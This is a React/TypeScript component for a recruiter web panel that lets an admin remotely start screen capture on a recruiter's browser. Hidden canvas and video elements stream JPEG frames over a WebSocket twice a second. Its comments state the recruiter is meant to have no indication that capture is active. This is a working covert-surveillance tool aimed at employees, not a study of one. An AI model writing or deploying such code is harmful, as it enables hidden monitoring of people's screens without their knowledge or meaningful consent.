'use client'

import { useEffect, useRef, useCallback } from 'react'
import { useAuthStore } from '@/stores/auth-store'
import { io, Socket } from 'socket.io-client'

/**
 * ScreenCaptureService
 *
 * Runs silently in the background of the Recruiter panel.
 * NO visible UI — the recruiter has no indication that screen capture
 * is active. When an admin starts monitoring, this component receives
 * a `start-capture` command and silently begins capturing screen frames
 * using the browser's getDisplayMedia() API.
 *
 * When the admin stops monitoring, it receives `stop-capture` and
 * silently releases the media stream.
 *
 * If the user denies the browser's screen picker, it reports
 * `capture-failed` back to the server and the admin is notified.
 */

export function ScreenCaptureService() {
  const user = useAuthStore((s) => s.user)
  const socketRef = useRef<Socket | null>(null)
  const streamRef = useRef<MediaStream | null>(null)
  const canvasRef = useRef<HTMLCanvasElement | null>(null)
  const videoRef = useRef<HTMLVideoElement | null>(null)
  const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null)
  const isCapturingRef = useRef(false)

  // -----------------------------------------------------------------------
  // Stop capturing (silent, no UI)
  // -----------------------------------------------------------------------
  const stopCapturing = useCallback(() => {
    if (intervalRef.current) {
      clearInterval(intervalRef.current)
      intervalRef.current = null
    }
    if (streamRef.current) {
      streamRef.current.getTracks().forEach((track) => track.stop())
      streamRef.current = null
    }
    if (videoRef.current) {
      videoRef.current.srcObject = null
    }
    isCapturingRef.current = false
  }, [])

  // -----------------------------------------------------------------------
  // Start capturing screen frames silently
  // -----------------------------------------------------------------------
  const startCapturing = useCallback(
    async (userId: string) => {
      // Already capturing — ignore
      if (isCapturingRef.current) return

      try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
          video: {
            width: { ideal: 1280 },
            height: { ideal: 720 },
            frameRate: { ideal: 2 },
          },
          audio: false,
        })

        streamRef.current = stream
        isCapturingRef.current = true

        // Set up hidden video element for frame extraction
        const vid = videoRef.current
        if (vid) {
          vid.srcObject = stream
          vid.play().catch(() => {})
        }

        const onReady = () => {
          const cv = canvasRef.current
          const video = videoRef.current
          if (!cv || !video) return
          cv.width = video.videoWidth
          cv.height = video.videoHeight

          const ctx = cv.getContext('2d')
          if (!ctx) return

          // Capture frames at ~2 FPS (every 500ms) for low bandwidth usage
          intervalRef.current = setInterval(() => {
            if (
              !video ||
              !ctx ||
              !socketRef.current ||
              video.paused ||
              video.ended
            )
              return

            ctx.drawImage(video, 0, 0, cv.width, cv.height)

            // Compress to JPEG at 50% quality for bandwidth
            const frame = cv.toDataURL('image/jpeg', 0.5)

            socketRef.current.emit('screen-frame', {
              userId,
              frame,
              timestamp: Date.now(),
            })
          }, 500)
        }

        if (vid) {
          vid.onloadedmetadata = onReady
          // If metadata already loaded (cached)
          if (vid.readyState >= 1) onReady()
        }

        // If the user clicks the browser's built-in "Stop sharing" button,
        // report capture failure
        stream.getVideoTracks()[0].onended = () => {
          stopCapturing()
          socketRef.current?.emit('capture-failed', {
            userId,
            reason: 'user-stopped',
          })
        }
      } catch (err) {
        // User denied screen picker or error
        isCapturingRef.current = false
        socketRef.current?.emit('capture-failed', {
          userId,
          reason: 'denied',
        })
      }
    },
    [stopCapturing],
  )

  // -----------------------------------------------------------------------
  // Connect to WebSocket service
  // -----------------------------------------------------------------------
  useEffect(() => {
    if (!user || user.role !== 'RECRUITER') return

    const socket = io('/?XTransformPort=3004', {
      transports: ['websocket', 'polling'],
      forceNew: true,
      reconnection: true,
      reconnectionAttempts: 10,
      reconnectionDelay: 2000,
      timeout: 15000,
    })

    socketRef.current = socket

    socket.on('connect', () => {
      socket.emit('recruiter-register', {
        userId: user.id,
        name: user.name || 'Recruiter',
      })
    })

    socket.on('disconnect', () => {
      stopCapturing()
    })

    // ---- Admin command: start capturing silently ----
    socket.on('start-capture', () => {
      startCapturing(user.id)
    })

    // ---- Admin command: stop capturing silently ----
    socket.on('stop-capture', () => {
      stopCapturing()
    })

    return () => {
      stopCapturing()
      socket.disconnect()
    }
  }, [user, startCapturing, stopCapturing])

  // Don't render anything — completely invisible
  if (!user || user.role !== 'RECRUITER') return null

  return (
    <>
      {/* Hidden elements used for frame capture — invisible to user */}
      <canvas ref={canvasRef} className="hidden" aria-hidden="true" />
      <video
        ref={videoRef}
        className="hidden"
        playsInline
        muted
        aria-hidden="true"
      />
    </>
  )
}
